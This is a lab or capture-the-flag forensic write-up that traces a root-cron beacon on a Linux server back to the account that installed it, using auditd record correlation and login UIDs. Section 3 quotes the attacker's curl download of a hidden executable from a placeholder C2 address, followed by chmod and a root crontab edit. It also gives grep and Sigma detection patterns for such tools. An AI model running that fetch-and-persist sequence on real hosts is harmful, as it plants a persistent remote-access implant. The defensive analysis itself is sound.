The Login UID Behind the Beacon

The beacon ran as root with no human login UID. The install steps still had one.

Summary

The challenge. Identify which employee installed a recurring remote-access implant on a Linux application server.

What I did. I correlated audit records by event ID, decoded the socket address, checked cron and authentication context, and resolved the installer's login UID through the roster.

The result. The installation chain pointed to one Finance account. The case is marked Solved; the employee name and submission are withheld.

The limit. The host logs and roster are not displayed here. Beaconing supports a C2 hypothesis, while the records shown in the case do not establish the contents or amount of any exfiltrated data.

1. Problem Statement and Threat Scenario

I had four logs from one Linux application server and a roster that mapped accounts to employees. The question was personal: which employee put a remote-access implant on the host? The audit log held process and connection records. Syslog, cron, and authentication records could tell me whether the suspicious file kept running and how the installer reached the privileged crontab.

Two Finance accounts looked worth investigating. One pulled a script from outside the host. The other left a chain that reached a hidden executable, a root cron edit, and repeated outbound connections. I needed the login UID from the installation steps to distinguish them. The later beacon process ran under cron and had no human login UID to give me.

2. Techniques, Tooling, and Actions Taken

I inventoried and hashed the logs, then counted the comm values in auditd. git, python3, apt-get, and systemctl made up much of the ordinary activity. A dot-prefixed executable named .upd stood out: it ran more than a thousand times from /tmp/.cache/ in the case records.

I read the relevant EXECVE arguments and joined each one to its SYSCALL record using the audit event ID. That gave me the login UID, session, current UID, and executable context for a download into /tmp/.cache/.upd, a chmod +x, and a crontab -u root -e. A separate USER_CHAUTHTOK entry reported a successful crontab edit. The cron log later showed root running the same path on a schedule. The install actions shared one human login UID and interactive session. The recurring .upd events had auid=4294967295, the unset value.

The SOCKADDR records let me decode the implant's IPv4 destination. The delivery URL and the later connections named the same host, with different ports. That joined the installation and egress stories. It did not reveal the application protocol or any data body. I resolved the human login UID through the roster only after the log chain held together.

I also tested the other Finance account. That account fetched and ran monitoring-agent.sh, which was suspicious enough to inspect. I found no matching root cron persistence or repeated connection from the implant path. The download source appeared in the auth log as failed pre-authentication scanning, which did not tie that account to the .upd chain. It remained a decoy for this question.

3. Tooling and Scripts

The useful audit rule keys were cmd_exec, net_connect, and network_tools. I looked at SYSCALL, EXECVE, and SOCKADDR records together. EXECVE held the argument vector; SYSCALL held auid, ses, tty, uid, and euid. Pairing by the event timestamp and serial mattered. Adjacent lines alone do not prove two records describe the same event.

These quick shell passes helped find the command outlier and the security-relevant arguments. I used event IDs for attribution after that first pass.

grep -oP 'comm="[^"]*"' audit.log | sort | uniq -c | sort -rn | head
grep 'type=EXECVE' audit.log | grep -E 'a0="(curl|wget|chmod|crontab)"'

The command sequence in the case, with the external address withheld, was:

curl -s -o /tmp/.cache/.upd http://<c2.ip>:8443/update
chmod +x /tmp/.cache/.upd
crontab -u root -e

I used a short parser for the socket field. For IPv4 sockaddr_in, the first two bytes name the family, the next two hold the port in network order, and the next four hold the address. The offline triage script includes a bounded version of that decode. It joins audit records by their actual event ID, then checks the install, cron, and egress links against the invented audit sample and cron sample. The guide gives the input contract and limits. It never contacts an endpoint.

4. Concept Explanation

Linux audit events often span several records. SYSCALL describes process context. EXECVE lists arguments. A network event may add SOCKADDR. The audit timestamp and serial bind records from one event. I can read the command from one record and its login UID from the paired record without borrowing identity from the wrong command.

The auid field is the audit login UID. It normally follows a process tree from the login entry point, including through sudo or su. A cron or daemon process may show it as unset, printed as 4294967295. Linux audit documentation describes that sentinel. I still have to check collection and privilege history. The immutable-loginuid setting is an option; I cannot assume every host enabled it or that an auid alone settles person-level attribution.

The hidden file path mattered because the same path appeared in the download, chmod, cron execution, and later network process. Cron kept the executable running after the interactive session ended. A decoded socket address let me compare the destination with the delivery host. Matching hosts and recurring connections support a command-and-control hypothesis. Traffic content would be needed to show what the process sent.

5. Exploit / Analysis Mechanics

The attribution rests on the installer, not the beacon. The audit record for the download placed a network tool, a hidden output path, a human login UID, and an interactive session together. The same login UID and session covered chmod and the root crontab command. The success record and cron log supplied separate evidence that the schedule was installed and ran the file. Later .upd socket records showed repeated outbound connections with an unset login UID, which fits headless execution.

The roster mapped the installer login UID to one employee. The other Finance account never touched the implant path in the case record and had no matching persistence or egress. That makes the roster resolution meaningful. A generic count of suspicious commands would have left both accounts in play.

One gap deserves a hard stop before any real-world person-level conclusion. The installation actions show root uid and euid under a non-privileged login UID, but the provided sequence has no matching sudo or su record. The case labels that as a synthetic-data quirk. On a real host I would reconstruct the privilege transition and verify the login UID policy before treating the roster name as proven. The logs also show beaconing, not an exfiltrated payload. The exercise's exfiltration claim stays an inference.

6. Lessons Learned

Counting executable names gave me a cheap starting point. The useful work began when I followed one file path through the audit event pairs, root cron activity, and outbound sockets. The unset login UID on .upd looked like a dead end until I went back to the install sequence.

The decoy was useful too. A script pulled from the internet can be concerning, but the second account lacked the rest of the chain. I would not name an insider from an isolated download. The missing privilege transition is another reason to keep the answer bounded to this exercise.

7. Operational Extrapolation

Individual Practitioner Development

This case exercised multi-record audit correlation, login UID attribution, and raw socket decoding. I would next replay the sequence in a controlled Linux lab with audit rules enabled and logs shipped to a SIEM. That would tell me whether the event ID, command-line, and cron fields survive the pipeline the way this analysis needs them.

Security Operations

The useful detection path is a chain: network utility writes a hidden temporary file, the same login UID changes its permissions and edits root cron, cron runs that path, and the process makes repeated outbound connections. The offline triage tool demonstrates the join on invented records. A Sigma rule covers only the first process-creation step. An analyst still needs the full checklist, the crontab, and network telemetry before escalating a person-level or exfiltration claim.

Intelligence Operations

The hidden path and external address would be useful case observables if they came from a real incident. This exercise's values are sanitized. One host and one chain do not support actor attribution or a campaign report. I would preserve source times, process identity, and the delivery-to-egress relationship before sharing any indicator outside the investigation.

8. Reusable Tools, Scripts, and Artifacts

The read-only audit triage tool takes an audit text file and a cron text file. It emits JSON with a candidate login UID, session, hidden path, delivery IP, beacon count, cron run count, and orphaned EXECVE count. It requires matching event IDs for audit joins, a successful install sequence, a successful crontab edit, at least two root cron runs, and at least two AF_INET connections from that exact path to the delivery host. It handles a bounded subset of Linux audit formats and literal IPv4 URLs.

The invented audit log, cron log, and expected finding let a reader run the same check. The tests include the complete chain, a second account's unrelated download, missing corroboration, a wrong endpoint, malformed socket data, and normalized process-field examples. Five local test groups passed. The guide states every input and limit. The ten-step checklist covers the human review that the script cannot perform. The Sigma file is a separate, experimental staging signal.

python -B artifacts/auditd_rat_triage.py fixtures/auditd_sample.log fixtures/cron_sample.log
cd artifacts
python -B -m unittest -v test_auditd_rat_triage.py

The tool uses Python's standard library. The optional Sigma-selection test needs PyYAML. These fixtures use invented accounts and a documentation-range address. They support a local lab, not production validation.

9. Framework Applicability and Mapping

Three MITRE ATT&CK mappings fit the recorded chain. The external file transfer aligns with T1105, Ingress Tool Transfer. Dot-prefixed staging aligns with T1564.001, Hidden Files and Directories. Recurring root cron execution aligns with T1053.003, Cron. These describe the exercise behavior; they do not establish a real campaign.

I leave two tempting mappings as hypotheses. A socket to a port commonly used for web traffic does not prove T1071.001, Web Protocols without protocol evidence. Beaconing alone does not establish T1041, Exfiltration Over C2 Channel. STRIDE's disclosure and privilege concerns can frame a real system review, but this case did not assess a design. OWASP web categories do not fit the host-log task.

10. Threat Intelligence and Standards Integration

I would not publish the sanitized endpoint as a STIX Indicator. It uses a documentation-range address and has no value as a real-world IOC. A STIX attack-pattern or course-of-action object could describe generic behavior, but would add no case-specific intelligence here. No TAXII exchange occurred. The better portable artifact for this record is the triage logic and its test cases, with exact telemetry requirements and uncertainty visible.

11. Controls Mapping and Mitigation Realization

Standards Mapping

The case shows why NIST SP 800-53 Rev. 5 AU-2 and AU-12 logging, AU-6 review, SI-4 monitoring, AC-6 least privilege, and CM-7 least functionality would matter to an organization with this host. CIS Controls v8 8.5, 8.8, and 8.11 cover detailed logs, command lines, and review; 13.1 covers centralized alerting, and Control 6 covers access management. These are relevance mappings. The exercise does not assess whether any organization implemented or passed those controls.

Mitigation Realization

I would ship audit event IDs, auid, session, arguments, socket data, cron activity, and privilege changes into a common timeline. Protect the root crontab and alert on changes initiated from a non-admin login UID. Review execution from writable paths, but test whether a /tmp noexec policy fits legitimate workloads before deploying it. Give the SOC a documented way to confirm the path, account, and egress data. The checklist and synthetic triage tool show the review steps; no host policy was deployed or assessed here.

12. Indicators, Artifacts, and Detection Engineering

The useful observables are a network utility writing /tmp/.cache/.upd, a root crontab edit, recurring execution of that path, and connections from it to the delivery host. The path and host in the fixture are invented examples. The Sigma rule takes normalized Linux process-creation fields Image and CommandLine and looks only for curl or wget writing a dot-prefixed path beneath /tmp. The tests parsed its YAML and exercised the selection against one positive, a plain /tmp updater, a URL-only near miss, and a different utility. I have not converted the rule for a SIEM backend or tested it on live telemetry.

I did not make a single-event Sigma rule claim to identify a non-admin root-cron edit. That decision needs the audit event join, a trustworthy login UID, a successful edit record, and an administrator inventory. The offline triage tool covers part of that chain with explicit assumptions.

For the full chain, the offline triage script needs SYSCALL and EXECVE joined by audit event ID, successful crontab edit records, root cron CMD lines, and AF_INET SOCKADDR events with the executable path. It reports a correlated candidate, not a confirmed person or exfiltration event. Legitimate maintenance can write hidden temporary files. Missing audit rules, log loss, a changed login UID, a different network family, or another cron format can hide a real sequence. The guide gives the exact mapping and the expected JSON makes the synthetic result inspectable.
